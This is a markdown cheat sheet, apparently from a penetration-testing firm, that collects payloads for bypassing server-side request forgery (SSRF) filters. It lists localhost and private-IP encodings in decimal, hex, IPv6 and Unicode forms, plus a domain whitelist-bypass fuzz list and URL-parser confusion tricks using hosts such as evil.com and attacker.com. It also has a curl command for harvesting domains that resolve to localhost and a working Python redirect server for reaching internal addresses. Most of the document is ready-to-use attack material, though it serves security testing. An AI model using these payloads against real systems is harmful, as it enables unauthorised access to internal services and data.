<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# SSRF File Bypass Techniques


## Summary

Below is a collections of payloads that could be used to bypass filters for applications using SSRF.


## Payloads

* This online SSRF URL host check bypass generator is great for quickly generating word list to test bypasses with a tool such as FFUF [https://tools.intigriti.io/redirector/](https://tools.intigriti.io/redirector/). 

* If an SSRF is found but, localhost is not allowed to be specified due to filtering, these payloads may bypass the filtering.

```
## Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://0
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile

## Unicode confusion
http://①②⑦.⓪.⓪.⓪

## CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

## Decimal bypass
http://2130706433/ = http://127.0.0.1
http://017700000001 = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

## Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20

##Domain FUZZ bypass (from https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt)
http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d={domain}
https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d={domain}
http://{domain}@localhost
http://localhost#{domain}
http://{domain}.localhost
http://localhost/{domain}
http://localhost/?d={domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}

## Malformed URLs and rare addresses
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

## Tricks
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
filter_var() php function: 0://evil.com:80;http://google.com:80/

## Weakparser
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

* If the web application is disallowing requests to the common addresses, ie 127.0.0.1, [::1], localhost, etc. The web application may not filter domain names that resolve to localhost addresses. At the time of writing, these domain names resolve to localhost addresses, please verify this before testing.

```
localtest.me -> 127.0.0.1
spoofed.burpcollaborator.net -> 127.0.0.1
bugbounty.dod.network -> 127.0.0.2
```
* If more domain names that resolve to local host are required, project sonar can be queried with the below command to obtain 10,000 domain names that resolve to a localhost address at a time. Although it is highly advised that domains are placed under a level of scrutiny before being used for testing.

```
curl 'https://sonar.omnisint.io/reverse/127.0.0.0/8' | jq .[] | tr -d '"[], ' 
```

* When the web application allows only for external hosts to be specified, but it does not check the final destination of the request. Hosting an external web server that redirects to private IP addresses may work. Below is an example of a simple python web server for this purpose. If the 302 does not work try other 300 redirection response codes.

```
#!/usr/bin/env python3

# example usage
#                      web server port    URL To Redirect To    
#python3 ./redirector.py    8000         http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       # send the 302 response code to let the client know that it need to request the URI specified in the Location header
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

* Below are a few techniques that could be used if the web application only excepts subdomains of a particular domains as a destinations, but it does not check the final destination of the request.

    * Try to use the "Backslash-trick" to test for conflicting URL parsers for example ```https://attacker.com\@victim.com/``` or ```https://attacker.com\anything@victim.com/```

 	* Look for subdomains of those domains that point to a localhost address or private IP addresses. It is worth checking for the subdomain ```localhost```, it is relatively common for that subdomain to resolve to 127.0.0.1.

	* Look for an open redirect vulnerability on web applications that have domain names that are white listed. An open redirect could be used to redirect to private IP addresses.

	* Look for a subdomain take over vulnerable on subdomains of white listed domains. After identifying a sub domain vulnerable to subdomain take over, depending on which service the sub domain exists on it could be used to create an open redirect to redirect to private IP addresses.


# References 

[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)


[https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

